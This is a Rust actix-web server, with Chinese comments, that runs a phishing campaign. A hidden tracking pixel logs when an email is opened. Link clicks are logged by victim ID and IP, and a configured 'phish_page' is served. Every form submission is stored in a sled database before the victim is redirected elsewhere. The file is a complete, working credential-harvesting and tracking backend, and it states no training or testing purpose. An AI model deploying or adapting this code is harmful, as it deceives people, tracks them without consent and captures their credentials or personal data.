use actix_web::{http::StatusCode, post, web, App, HttpRequest, HttpResponse, HttpServer, Responder, ResponseError, Result, cookie::Key};
use actix_cors::Cors;
use std::io;
use std::env;
use actix_web::middleware::Logger;
use std::sync::{Arc, Mutex};
// use once_cell::sync::Lazy;
use sled;
use chrono::{Utc, FixedOffset};
use std::fs;
use {
    zerocopy::{
        AsBytes, LayoutVerified, U16, U32, FromBytes, Unaligned
    },
};

// use rustls_pemfile::{certs, pkcs8_private_keys};
// use rustls::{ pki_types::PrivateKeyDer, ServerConfig };

mod db;

use db::*;
use common::structs::*;
use common::utils::*;


#[derive(Debug)]
struct AppState {
    log: Mutex<Vec<String>>, // 用于存储日志信息
}

#[actix_web::main]
async fn main() -> io::Result<()> {
    // 1. 环境变量和日志初始化
    env::set_var("RUST_LOG", "info");
    env_logger::init_from_env(env_logger::Env::new().default_filter_or("info"));
    
    // 2. 数据库初始化
    let db = sled::open("database").map_err(|e| {
        log::error!("Failed to open database: {}", e);
        io::Error::new(io::ErrorKind::Other, "Database initialization failed")
    })?;
    
    let action_tree = Arc::new(db.open_tree("actions").map_err(|e| {
        log::error!("Failed to open actions tree: {}", e);
        io::Error::new(io::ErrorKind::Other, "Actions tree initialization failed")
    })?);
    
    let data_tree = Arc::new(db.open_tree("data").map_err(|e| {
        log::error!("Failed to open data tree: {}", e);
        io::Error::new(io::ErrorKind::Other, "Data tree initialization failed")
    })?);

    // 3. 配置加载
    let config = Config::load().map_err(|e| {
        log::error!("Failed to load config: {}", e);
        io::Error::new(io::ErrorKind::Other, "Configuration loading failed")
    })?;
    
    let bind_addr = format!("{}:{}", config.server.ip, config.server.port);
    log::info!("Starting server on {}", bind_addr);

    let index_path = "/index/{id}";
    let image_path = "/image/{id}";

    // 4. 服务器启动
    HttpServer::new(move || {
        let cors = Cors::permissive();
        App::new()
            .wrap(cors)
            .wrap(Logger::default())
            .app_data(web::Data::new(ActionTree(Arc::clone(&action_tree))))
            .app_data(web::Data::new(DataTree(Arc::clone(&data_tree))))
            .app_data(web::Data::new(config.clone()))
            .route("/submit", web::post().to(handle_post))
            .route(&index_path, web::get().to(handle_index))
            .route(&image_path, web::get().to(handle_image))
    })
    .bind(&bind_addr).map_err(|e| {
        log::error!("Failed to bind server to {}: {}", bind_addr, e);
        e
    })?
    .workers(2)
    .run()
    .await
}

async fn handle_index(
    req: HttpRequest, 
    action_tree: web::Data<ActionTree>,
    config: web::Data<Config>
) -> HttpResponse {
    // 从URL路径中提取ID
    let user_id = req.match_info()
        .get("id")
        .unwrap_or("None");

    let connection_info = req.connection_info();
    let peer_addr = connection_info.peer_addr().unwrap_or("unknown");

    let timestamp = Utc::now();
    let china_offset = FixedOffset::east_opt(8 * 3600)
        .ok_or_else(|| {
            log::error!("Failed to create timezone offset");
            "Invalid timezone offset"
        })
        .unwrap_or(FixedOffset::east_opt(0).unwrap());
    let timestamp_china = timestamp.with_timezone(&china_offset).to_rfc3339();

    let log_entry = format!("点击链接： Time: {}, IP: {}, ID: {}", timestamp_china, peer_addr, user_id);
    log::info!("{}", log_entry);

    // 处理数据库操作
    let newid = match get_next_id_for_tree(&action_tree.get_tree()) {
        Ok(id) => U16::new(id),
        Err(e) => {
            log::error!("Failed to get next ID: {}", e);
            return HttpResponse::InternalServerError().body("Server error");
        }
    };

    let action = Action { 
        id: newid,
        user_id: string_to_u8_4_gbk(user_id),
        time: string_to_u8_32_gbk(&timestamp_china), 
        ip: string_to_u8_32_gbk(peer_addr), 
        atype: U16::new(1), 
        data_id: U16::new(0)
    };

    match create_action(&action_tree.get_tree(), action){
        Ok(_) => {
            log::info!("Actions写入数据库成功");
        },
        Err(_) =>{
            log::error!("Actions写入数据库失败");
        }
    }

    // 读取页面文件
    match fs::read_to_string(&config.paths.phish_page) {
        Ok(content) => HttpResponse::Ok().content_type("text/html").body(content),
        Err(e) => {
            log::error!("Failed to read phish page: {}", e);
            HttpResponse::InternalServerError().body("Error loading page")
        }
    }
}

async fn handle_post(
    req: HttpRequest,
    form: web::Bytes,
    action_tree: web::Data<ActionTree>,
    data_tree: web::Data<DataTree>,
    config: web::Data<Config>
) -> HttpResponse {
    let connection_info = req.connection_info();
    let peer_addr = connection_info.peer_addr().unwrap_or("unknown");

    // 从 referer 中获取 user_id
    let referer = req.headers()
        .get("referer")
        .and_then(|h| h.to_str().ok())
        .unwrap_or("");

    // 从 referer URL 中提取 id
    let user_id = referer
        .split('/')
        .last()
        .unwrap_or("unknown");

    let timestamp = Utc::now();
    let china_offset = FixedOffset::east_opt(8 * 3600)
        .ok_or_else(|| {
            log::error!("Failed to create timezone offset");
            "Invalid timezone offset"
        })
        .unwrap_or(FixedOffset::east_opt(0).unwrap());
    let timestamp_china = timestamp.with_timezone(&china_offset).to_rfc3339();

    let received_text = match std::str::from_utf8(&form) {
        Ok(v) => v,
        Err(e) => {
            log::error!("Invalid UTF-8 in form data: {}", e);
            return HttpResponse::BadRequest().body("Invalid form data");
        }
    };

    log::info!("提交信息： Time: {}, IP: {}, Data: {}, UserID: {}", timestamp_china, peer_addr, received_text, user_id);

    // 获取数据ID
    let newid_data = match get_next_id_for_tree(&data_tree.get_tree()) {
        Ok(id) => U16::new(id),
        Err(e) => {
            log::error!("Failed to get data ID: {}", e);
            return HttpResponse::InternalServerError().body("Server error");
        }
    };

    // 获取动作ID
    let newid_action = match get_next_id_for_tree(&action_tree.get_tree()) {
        Ok(id) => U16::new(id),
        Err(e) => {
            log::error!("Failed to get action ID: {}", e);
            return HttpResponse::InternalServerError().body("Server error");
        }
    };

    let action = Action { 
        id: newid_action,
        user_id: string_to_u8_4_gbk(user_id),
        time: string_to_u8_32_gbk(&timestamp_china), 
        ip: string_to_u8_32_gbk(peer_addr), 
        atype: U16::new(2), 
        data_id: newid_data
    };

    let data = Data {
        id: newid_data,
        data: string_to_u8_512_gbk(received_text)
    };

    match create_action(&action_tree.get_tree(), action){
        Ok(_) => {
            log::info!("Actions写入数据库成功");
        },
        Err(_) =>{
            log::error!("Actions写入数据库失败");
            return HttpResponse::InternalServerError().body("提交失败，请重试")
        }
    }

    match create_data(&data_tree.get_tree(), data){
        Ok(_) => {
            log::info!("Data写入数据库成功");
        },
        Err(_) =>{
            log::error!("Data写入数据库失败");
            return HttpResponse::InternalServerError().body("提交失败，请重试")
        }
    }

    HttpResponse::Found()
        .append_header(("Location", config.paths.redirect_url.as_str()))
        .finish()
}

async fn handle_image(
    req: HttpRequest, 
    action_tree: web::Data<ActionTree>,
    config: web::Data<Config>
) -> HttpResponse {
    // 从URL路径中提取ID
    let user_id = req.match_info()
        .get("id")
        .unwrap_or("None");

    let connection_info = req.connection_info();
    let peer_addr = connection_info.peer_addr().unwrap_or("unknown");

    let timestamp = Utc::now();
    let china_offset = FixedOffset::east_opt(8 * 3600)
        .ok_or_else(|| {
            log::error!("Failed to create timezone offset");
            "Invalid timezone offset"
        })
        .unwrap_or(FixedOffset::east_opt(0).unwrap());
    let timestamp_china = timestamp.with_timezone(&china_offset).to_rfc3339();

    let log_entry = format!("打开邮件： Time: {}, IP: {}, ID: {}", timestamp_china, peer_addr, user_id);
    log::info!("{}", log_entry);

    // 处理数据库操作
    let newid = match get_next_id_for_tree(&action_tree.get_tree()) {
        Ok(id) => U16::new(id),
        Err(e) => {
            log::error!("Failed to get next ID: {}", e);
            return HttpResponse::InternalServerError().body("Server error");
        }
    };

    let action = Action { 
        id: newid,
        user_id: string_to_u8_4_gbk(user_id),
        time: string_to_u8_32_gbk(&timestamp_china), 
        ip: string_to_u8_32_gbk(peer_addr), 
        atype: U16::new(0), 
        data_id: U16::new(0)
    };

    match create_action(&action_tree.get_tree(), action){
        Ok(_) => {
            log::info!("Actions写入数据库成功");
        },
        Err(_) =>{
            log::error!("Actions写入数据库失败");
        }
    }

    // 读取页面文件
    // 返回一个1x1的透明像素
    let transparent_pixel: &[u8] = &[
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
        0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
        0x01, 0x00, 0x3B
    ];
    HttpResponse::Ok()
        .content_type("image/gif")
        .body(transparent_pixel)
}
